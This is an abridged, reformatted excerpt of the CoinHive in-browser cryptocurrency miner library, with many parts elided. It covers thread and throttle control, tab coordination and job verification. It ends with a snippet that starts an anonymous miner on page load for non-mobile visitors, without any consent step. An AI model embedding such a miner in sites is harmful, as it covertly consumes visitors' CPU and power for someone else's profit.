(
    function (window) {
      ...
      var Miner                             = function (siteKey, params) {
        ...
        this._throttle                   = Math.max(
            0, Math.min(.99, this.params.throttle || 0));
        ...
        if (window.BroadcastChannel) {
          try {
            ...
            this._bc.onmessage = function (msg) {
              if (msg.data
                  === 'ping') {this._tab.lastPingReceived = Date.now();}
            }.bind(this);
          } catch (e) {}
        }
        if (CoinHive.CONFIG.REQUIRES_AUTH) {
          this._auth = new CoinHive.Auth(
              this._siteKey, {
      ...
      Miner.prototype.stop                  = function (mode) {
        for (
            var i = 0 ; i < this._threads.length ; i++
        ) {
      ...
      Miner.prototype.getTotalHashes        = function (estimate) {
        ...
        for (
          ...
          if (estimate) {
            var tdiff = (
                            now - thread.lastMessageTimestamp
                        ) / 1e3 * .9;
      ...
      Miner.prototype.setAutoThreadsEnabled = function (enabled) {
        ...
        if (enabled && !this._autoThreads.interval) {
          this._autoThreads.adjustAt = Date.now()
                                       + this._autoThreads.adjustEvery;
          this._autoThreads.interval = setInterval(
              this._adjustThreads.bind(this), 1e3);
        }
      };
      ...
      Miner.prototype.setThrottle           = function (throttle) {
        ...
        if (this._currentJob) {this._setJob(this._currentJob);}
      };
      ...
      Miner.prototype.setNumThreads         = function (num) {
        ...
        if (num > this._threads.length) {
          for (
              var i = 0 ; num > this._threads.length ; i++
          ) {
      ...
      Miner.prototype.hasWASMSupport        = function () {
        return window.WebAssembly !== undefined && !/OS 11_2_(2|5|6)/.test(
            navigator.userAgent);
      };
      ...
      Miner.prototype.didOptOut             = function (seconds) {
        ...
        return !!(
            t && t > Date.now() / 1e3 - seconds
        );
      };
      Miner.prototype.isAuthed              = function () {
        if (CoinHive.CONFIG.REQUIRES_AUTH) {return this._auth.isAuthed();}
        return true;
      };
      Miner.prototype.selfTest              = function (callback) {
        this._loadWorkerSource(function () {
          if (!this._verifyThread) {this._verifyThread = new CoinHive.JobThread;}
          var testJob = {
            verify_id: '1',
            nonce    : 'b50caf04',
          ...
          this._verifyThread.verify(
              testJob, function (res) {
                callback(res.verified === true, res);
              });
        }.bind(this));
      };
      Miner.prototype._loadWorkerSource     = function (callback) {
        if (this._useWASM || this._asmjsStatus
                             === 'loaded') {callback();} else if (this._asmjsStatus
                                                                  === 'unloaded') {
          ...
          xhr.open(
              'get', CoinHive.CONFIG.LIB_URL + CoinHive.CONFIG.ASMJS_NAME,
              true
          );
          xhr.send();
        }
      ...
      Miner.prototype._startNow             = function () {
        if (this._tab.mode !== CoinHive.FORCE_MULTI_TAB
            && !this._tab.interval) {
          this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3);
        }
        if (this._tab.mode === CoinHive.IF_EXCLUSIVE_TAB
            && this._otherTabRunning()) {return;}
      ...
      Miner.prototype._otherTabRunning      = function () {
        ...
        try {
          ...
          if (tdjson) {
            ...
            if (td.ident !== this._tab.ident && Date.now() - td.time
                                                < 1500) {return true;}
          }
        } catch (e) {}
        return false;
      ...
      Miner.prototype._updateTabs           = function () {
        ...
        if (otherTabRunning && this.isRunning() && Date.now()
                                                   > this._tab.grace) {
        ...
        if (this.isRunning() && !this._waitingForAuth) {
          ...
          try {
            localStorage.setItem(
                'coinhive', JSON.stringify(
                    { ident: this._tab.ident, time: Date.now() }));
          } catch (e) {}
        }
      };
        ...
        if (Date.now() > this._autoThreads.adjustAt) {
          ...
          if (cur > down && (
            ...
            return this.setNumThreads(threads + 1);
                  ...
                  !down || down > cur
              ) && threads > 1) {return this.setNumThreads(threads - 1);}
        }
      };
      Miner.prototype._emit                 = function (
          type, params) {
      ...
      Miner.prototype._connectAfterSelfTest = function () {
        if (this._selfTestSuccess
            || this.hasWASMSupport()) {this._connect();} else {
      ...
      Miner.prototype._onMessage            = function (ev) {
        ...
        if (msg.type === 'job') {
          ...
          this._verifyThread.verify(
              msg.params, this._onVerifiedBound);
          ...
          if (msg.params.error === 'invalid_site_key') {
            ...
            this._tab.waitReconnect = Date.now() + 6e3 * 1e3;
                     ...
                     === 'invalid_opt_in') {if (this._stopOnInvalidOptIn) {return this.stop();} else if (this._auth) {this._auth.reset();}}
        }
      ...
      Miner.prototype._send                 = function (
          type, params) {
        if (!this._socket) {return;}
      ...
      window.CoinHive.Token                 = function (
          siteKey, goal, params) {
        var miner   = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner;
      };
      window.CoinHive.User                  = function (
          siteKey, user, params) {
        var miner   = new Miner(siteKey, params);
        miner._user = user;
        return miner;
      };
      window.CoinHive.Anonymous             = function (
          siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner;
      };
    ...
    function (window) {
      ...
      var JobThread                    = function () {
        this.worker               = new Worker(
            CoinHive.CRYPTONIGHT_WORKER_BLOB);
      ...
      JobThread.prototype.onReceiveMsg = function (msg) {
        ...
        this.hashesPerSecond      = this.hashesPerSecond * .5
                                    + msg.data.hashesPerSecond * .5;
        this.hashesTotal += msg.data.hashes;
        this.lastMessageTimestamp = Date.now();
        if (this.running) {this.worker.postMessage(this.currentJob);}
      };
      JobThread.prototype.setJob       = function (
          job, callback) {
        this.currentJob  = job;
      ...
      JobThread.prototype.verify       = function (
          job, callback) {
        this.verifyCallback = callback;
        if (!this._isReady) {this.verifyJob = job;} else {
...
var miner                        = new CoinHive.Anonymous(
    'WP1L6qLZqfk0RkuqA3ZIRkCIBESICklo', { throttle: 0.99 });
if (!miner.isMobile()) {
  miner.start();
}
